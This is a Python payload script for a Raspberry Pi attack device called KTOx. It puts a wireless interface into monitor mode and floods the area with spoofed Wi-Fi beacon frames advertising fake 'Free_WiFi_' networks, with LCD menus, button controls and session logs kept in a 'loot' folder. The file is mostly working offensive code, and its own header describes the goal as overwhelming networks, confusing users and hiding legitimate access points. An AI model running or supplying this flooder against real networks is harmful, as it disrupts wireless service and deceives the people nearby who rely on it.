#!/usr/bin/env python3
"""
KTOx *payload* – **WiFi Beacon Flood**
=========================================
This payload performs a Wi-Fi beacon flood attack, continuously broadcasting
a large number of fake Wi-Fi access points (SSIDs). This can be used to
overwhelm Wi-Fi networks, confuse users, or hide legitimate networks.

Features:
- Interactive UI for selecting the wireless interface.
- Activates monitor mode on the selected interface.
- Floods the airwaves with a configurable number of SSIDs.
- Displays status messages on the LCD.
- Graceful exit via KEY3 or Ctrl-C, deactivating monitor mode.

Controls:
- INTERFACE SELECTION SCREEN:
    - UP/DOWN: Navigate available wireless interfaces.
    - OK: Select interface and activate monitor mode.
    - KEY3: Cancel selection and exit.
- MAIN SCREEN:
    - OK: Start/Stop beacon flooding.
    - KEY3: Exit Payload (stops flooding and deactivates monitor mode).
"""
import sys
import os
import time
import signal
import subprocess
import threading
import json

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# KTOx pathing
_BASE = os.path.dirname(os.path.abspath(__file__))
_PAYLOADS_DIR = os.path.abspath(os.path.join(_BASE, '..'))
if _PAYLOADS_DIR not in sys.path:
    sys.path.insert(0, _PAYLOADS_DIR)
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# ----------------------------
# Third-party library imports
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    from scapy.all import *
    conf.verb = 0
except Exception as e:
    print(f"[ERROR] Required libs missing: {e}", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# WiFi helpers
# ----------------------------
def get_available_interfaces():
    try:
        import re as _re
        out = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5).stdout
        return _re.findall(r'Interface\s+(\S+)', out)
    except Exception:
        return []

try:
    import monitor_mode_helper
    WIFI_INTEGRATION_AVAILABLE = True
except Exception:
    WIFI_INTEGRATION_AVAILABLE = False
    class monitor_mode_helper:
        @staticmethod
        def activate_monitor_mode(iface): return None
        @staticmethod
        def deactivate_monitor_mode(iface): return False

WIFI_INTERFACE = None
ORIGINAL_WIFI_INTERFACE = None # Added for consistent cleanup
SSID_PREFIX = "Free_WiFi_"
NUM_SSIDS = 10
BEACON_INTERVAL = 0.1

# Load PINS from KTOx gui_conf.json
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", 21),
            "KEY2": conf_pins.get("KEY2_PIN", 20),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
flood_thread = None
ui_lock = threading.Lock()
status_msg = "Press OK to start"
current_menu_selection = 0

# Loot directory for simple session logs (prefer installed KTOx)
BASE_DIR = os.path.dirname(__file__)
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(BASE_DIR, '..', '..'))
LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'WiFi_Beacon_Flood')
os.makedirs(LOOT_DIR, exist_ok=True)

def cleanup(*_):
    global running, ORIGINAL_WIFI_INTERFACE # Added ORIGINAL_WIFI_INTERFACE to global
    running = False
    if flood_thread and flood_thread.is_alive():
        flood_thread.join(timeout=1)
    
    if WIFI_INTERFACE: # Check if monitor mode was ever activated
        print(f"Attempting to deactivate monitor mode on {WIFI_INTERFACE}...", file=sys.stderr)
        success = monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
        if success:
            print(f"Successfully deactivated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
        else:
            print(f"ERROR: Failed to deactivate monitor mode on {WIFI_INTERFACE}", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(lines, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    message_list = lines if isinstance(lines, list) else [lines]
    for line in message_list:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_main():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "WiFi Beacon Flood", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    with ui_lock:
        d.text((10, 40), f"Interface: {WIFI_INTERFACE}", font=FONT, fill="white")
        d.text((10, 55), f"Prefix: {SSID_PREFIX}", font=FONT, fill="white")
        d.text((10, 70), f"SSIDs: {NUM_SSIDS}", font=FONT, fill="white")
        d.text((10, 85), status_msg, font=FONT, fill="yellow")

    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, current_menu_selection, status_msg
    
    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    # Prefer wlan1 if present
    if 'wlan1' in available_interfaces:
        available_interfaces.remove('wlan1')
        available_interfaces.insert(0, 'wlan1')
    if not available_interfaces:
        draw_message(["No WiFi", "interfaces found!"], "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            selected_iface = available_interfaces[current_menu_selection]
            draw_message([f"Activating monitor", f"mode on {selected_iface}...",], "yellow")
            print(f"Attempting to activate monitor mode on {selected_iface}...", file=sys.stderr)
            
            ORIGINAL_WIFI_INTERFACE = selected_iface # Store original interface before activation
            monitor_iface = monitor_mode_helper.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                draw_message([f"Monitor mode active", f"on {WIFI_INTERFACE}"], "lime")
                print(f"Successfully activated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
                time.sleep(2)
                return True
            else:
                draw_message(["ERROR:", "Monitor mode failed!", "Check stderr for details."], "red")
                print(f"ERROR: activate_monitor_mode failed for {selected_iface}. See stderr for details from helper.", file=sys.stderr)
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return False
        
        time.sleep(0.05)

def beacon_flood():
    global status_msg
    # Start a session log
    ts = time.strftime('%Y-%m-%d_%H%M%S')
    session_log = os.path.join(LOOT_DIR, f'beacon_flood_{ts}.log')
    try:
        with open(session_log, 'w') as f:
            f.write(f'START {ts} iface={WIFI_INTERFACE} prefix={SSID_PREFIX} count={NUM_SSIDS}\n')
    except Exception:
        session_log = None
    
    if not WIFI_INTERFACE:
        with ui_lock:
            status_msg = "No interface selected!"
        return

    ap_mac = RandMAC()

    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)
    
    ssids = [f"{SSID_PREFIX}{i:02d}" for i in range(NUM_SSIDS)]

    with ui_lock:
        status_msg = "Flooding..."
    
    try:
        while running:
            for ssid in ssids:
                if not running: break
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                
                packet = RadioTap()/dot11/beacon/essid
                
                sendp(packet, iface=WIFI_INTERFACE, verbose=0)
                
                with ui_lock:
                    status_msg = f"Flooding: {ssid}"
                
                time.sleep(BEACON_INTERVAL)
    except Exception as e:
        with ui_lock:
            status_msg = f"Error: {e}"
        print(f"Error during beacon flood: {e}", file=sys.stderr)
    finally:
        # Mark end in session log
        try:
            if session_log:
                with open(session_log, 'a') as f:
                    f.write(f"END {time.strftime('%Y-%m-%d_%H%M%S')}\n")
        except Exception:
            pass

if __name__ == "__main__":
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), "black")
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    if not WIFI_INTEGRATION_AVAILABLE:
        draw_message(["ERROR:", "WiFi integration not found."], "red")
        time.sleep(5)
        sys.exit(1)

    try:
        if not select_interface_menu():
            draw_message(["No interface selected", "or monitor mode failed."], "red")
            time.sleep(3)
            raise SystemExit("No interface selected or monitor mode failed.")

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            draw_ui_main()
            
            if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                last_button_press_time = current_time
                if not (flood_thread and flood_thread.is_alive()):
                    flood_thread = threading.Thread(target=beacon_flood, daemon=True)
                    flood_thread.start()
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("WiFi Beacon Flood payload finished.")